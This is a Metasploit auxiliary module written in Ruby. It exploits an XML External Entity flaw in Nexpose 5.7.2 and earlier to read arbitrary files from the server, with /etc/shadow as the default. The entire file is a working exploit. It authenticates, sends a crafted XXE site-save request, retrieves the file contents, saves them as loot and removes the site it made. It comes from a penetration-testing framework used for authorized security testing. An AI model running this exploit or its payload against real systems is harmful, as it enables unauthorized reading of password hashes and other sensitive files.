##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'nexpose'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Nexpose XXE Arbitrary File Read',
      'Description' => %q{
        Nexpose v5.7.2 and prior is vulnerable to a XML External Entity attack via a number
        of vectors. This vulnerability can allow an attacker to a craft special XML that
        could read arbitrary files from the filesystem. This module exploits the
        vulnerability via the XML API.
      },
      'Author' =>
        [
        'Brandon Perry <bperry.volatile[at]gmail.com>', # Initial discovery and Metasploit module
        'Drazen Popovic <drazen.popvic[at]infigo.hr>',  # Independent discovery, alternate vector
        'Bojan Zdrnja <bojan.zdrnja[at]infigo.hr>'      # Independently reported
        ],
      'License' => MSF_LICENSE,
      'References'  =>
        [
          [ 'URL', 'https://community.rapid7.com/community/nexpose/blog/2013/08/16/r7-vuln-2013-07-24' ]
        ],
      'DefaultOptions' => {
        'SSL' => true
      }
    ))

  register_options(
    [
      Opt::RPORT(3780),
      OptString.new('USERNAME', [true, "The Nexpose user", nil]),
      OptString.new('PASSWORD', [true, "The Nexpose password", nil]),
      OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/shadow"])
    ], self.class)
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: DateTime.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run
    user = datastore['USERNAME']
    pass = datastore['PASSWORD']
    trust_store = datastore['TRUST_STORE']
    prot = ssl ? 'https' : 'http'

    nsc = Nexpose::Connection.new(rhost, user, pass, rport, nil, nil, trust_store)

    print_status("Authenticating as: " << user)
    begin
      nsc.login

      report_cred(
        ip: rhost,
        port: rport,
        service_name: prot,
        user: user,
        password: pass
      )

    rescue
      print_error("Error authenticating, check your credentials")
      return
    end

    xml = '<!DOCTYPE foo ['
    xml << '<!ELEMENT host ANY>'
    xml << %Q{<!ENTITY xxe SYSTEM "file://#{datastore['FILEPATH']}">}
    xml << ']>'
    xml << '<SiteSaveRequest session-id="'

    xml << nsc.session_id

    xml << '">'
    xml << '<Site id="-1" name="fdsa" description="fdfdsa">'
    xml << '<Hosts>'
    xml << '<host>&xxe;</host>'
    xml << '</Hosts>'
    xml << '<Credentials />'
    xml << '<Alerting />'
    xml << '<ScanConfig configID="-1" name="fdsa" templateID="full-audit" />'
    xml << '</Site>'
    xml << '</SiteSaveRequest>'

    print_status("Sending payload")
    begin
      fsa = nsc.execute(xml)
    rescue
      print_error("Error executing API call for site creation, ensure the filepath is correct")
      return
    end

    doc = REXML::Document.new fsa.raw_response_data
    id = doc.root.attributes["site-id"]

    xml = "<SiteConfigRequest session-id='" << nsc.session_id << "' site-id='" << id << "' />"

    print_status("Retrieving file")
    begin
      fsa = nsc.execute(xml)
    rescue
      nsc.site_delete id
      print_error("Error retrieving the file.")
      return
    end

    doc = REXML::Document.new fsa.raw_response_data

    print_status("Cleaning up")
    begin
      nsc.delete_site id
    rescue
      print_warning("Error while cleaning up site ID, manual cleanup required!")
    end

    unless doc.root.elements["//host"]
      print_error("No file returned. Either the server is patched or the file did not exist.")
      return
    end

    path = store_loot('nexpose.file','text/plain', rhost, doc.root.elements["//host"].first.to_s, "File from Nexpose server #{rhost}")
    print_good("File saved to path: " << path)
  end

end
